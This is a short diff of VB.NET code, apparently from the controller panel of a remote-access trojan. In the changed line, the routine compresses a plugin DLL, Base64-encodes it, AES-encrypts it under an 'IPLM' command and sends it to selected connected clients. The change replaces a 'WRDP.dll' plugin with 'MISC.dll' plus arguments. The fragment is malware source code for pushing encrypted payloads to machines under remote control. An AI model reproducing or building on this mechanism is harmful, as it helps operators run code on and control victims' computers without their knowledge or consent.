@@ -897,7 +897,7 @@ Public Class Main
         Try
             If L1.Items.Count > 0 Then
                 Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\WRDP.dll"), True)) + SPL + " "))
+                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|1"))
                 Await M.WriteAsync(CMD, 0, CMD.Length)
                 Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
 
